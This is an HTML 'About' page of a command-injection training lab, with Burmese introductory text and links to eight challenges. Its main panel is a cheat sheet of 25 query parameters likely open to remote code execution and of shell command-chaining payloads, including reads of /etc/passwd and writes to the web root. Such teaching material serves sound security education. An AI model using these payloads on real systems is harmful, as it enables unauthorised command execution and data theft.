<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Injection | About</title>
    <style>
        *{
            margin:0;
            padding:0;
        }
        body{
            background-image:url("assets/bac.jpg");
            background-size:cover;
            color:white;
        }
        #wrapper{
            margin:20px auto 0;
            width:1300px;
        }
        #header{
            text-align:center;
            height:100px;
            line-height:100px;
            margin:0;
            padding:0;
        }
        #main{
            width:1300px;
            border:3px solid red;
            padding:10px;
        }
        #list{
            width:998px;
            margin:0;
            padding:0px;
            height:700px;
            float:right;
            border-left:2px solid #F67280;
            text-align:center;
        }
        #data{
            width:295px;
            margin:0;
            padding-right:5px;
            height:700px;
            
        }
        #data ul{
            text-align:center;
        }
        #data ul li{
            list-style-type:none;
            height:45px;
            line-height:45px;
        }
        #data ul li:hover{
            background:#045D5D;
            border-radius:10px;
            border:2px solid green;
        }
        #data ul li a{
            text-decoration:none;
        }
        #data ul li a:link{
            color:yellow;
        }
        #data ul li a:active{
            color:red;
        }
        #data ul li a:visited{
            color:lightgreen;
        }
        .q{
            color:#DC143C;
            text-align:center;
        }
        .logo{
            border-radius:50%;
        }
        .p{
            font-size:20px;
        }
        #footer{
            width:1300px;
            text-align:center;
            height:50px;
            line-height:50px;
            font-size:20px;
        }
        .t{
            color:#66FF00;
        }
        .mar{
            padding:10px;
            width:600px;
            margin:1px auto 0;
        }
        h2{
            color:#555499;
        }
    </style>
    <script type="text/javascript"> 
function disableRightClick() 
{ 
alert("Sorry, right click is not allowed !!"); 
return false; 
} 
</script> 
</head>
<body oncontextmenu=" return disableRightClick();">

    <div id="wrapper">
        <div id="header">
            <h1 class="title">
                <font color="red">Command </font>
                <font color="lightgreen">Injection </font>
                <font color="yellow">Labs </font>
            </h1>
        </div>
        <div id="main">
            <div id="list"><br>
            <h1 class="q"><font color="#A52A2A">Title:</font> <font color="#98FF98">What is Command Injection</font></h1>
            <br><br>
<div style="height:590px;width:980px; text-align:justify; border:1px solid #ccc; padding:10px; 
margin-left:2px; font:16px/26px Georgia, Garamond, Serif;overflow:auto;color:cyan;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Command Injection အများအားလေ့လာရာတွင် Linux command ကိုအခြေခံသိထားမှသာ
လေ့လာရန်လွယ်ကူမှာဖြစ်ပါတယ်။ Command Injection လုပ်ရာတွင် သတိထားရမည့် 
Link ရဲ့ type များနဲ့ Link ပုံစံများကို အောက်မှာ လေ့လာလို့ရပါတယ်။  <br><br>
Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities<br>
?cmd={payload} <br>
?exec={payload} <br>
?command={payload} <br>
?execute{payload} <br>
?ping={payload} <br>
?query={payload} <br>
?jump={payload} <br>
?code={payload} <br>
?reg={payload} <br>
?do={payload} <br>
?func={payload} <br>
?arg={payload} <br>
?option={payload} <br>
?load={payload} <br>
?process={payload} <br>
?step={payload} <br>
?read={payload} <br>
?function={payload} <br>
?req={payload} <br>
?feature={payload} <br>
?exe={payload} <br>
?module={payload} <br>
?payload={payload} <br>
?run={payload} <br>
?print={payload} <br><br>
#Both Unix and Windows supported <br>
ls||id; ls ||id; ls|| id; ls || id # Execute both <br>
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe) <br>
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok <br>
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º <br>
ls %0A id # %0A Execute both (RECOMMENDED) <br>
<br>
#Only unix supported <br>
`ls` # `` <br>
$(ls) # $() <br>
ls; id # ; Chain commands <br>
ls${LS_COLORS:10:1}${IFS}id # Might be useful <br>
<br>
#Not executed but may be interesting <br>
> /var/www/html/out.txt #Try to redirect the output to a file <br>
< /etc/passwd #Try to send some input to the command <br>
</div>
            </div>
            <div id="data">
                <ul>
                <img src="assets/walking.gif" width="130" height="130" alt="trust me" class="logo">
                    <li><a href="lesson/easy.php">Challenge 1</a></li>
                    <li><a href="lesson/medium.php">Challenge 2</a></li>
                    <li><a href="lesson/lesson3.php">Challenge 3</a></li>
                    <li><a href="lesson/lesson4.php">Challenge 4</a></li>
                    <li><a href="lesson/lesson5.php">Challenge 5</a></li>
                    <li><a href="lesson/lesson6.php">Challenge 6</a></li>
                    <li><a href="lesson/lesson7.php">Challenge 7</a></li>
                    <li><a href="lesson/lesson8.php">Challenge 8</a></li>
                    <li><a href="index.php">Home</a></li>
                    <li><a href="lesson/read.php">Payloads</a></li><br>
                    <embed src="assets/song.mp3" loop="true" autostart="true" width="250" height="50">
                </ul>
            </div>
        </div>
        <div id="footer">Labs by Phyo Myat Han</div>
    </div>
</body>
</html>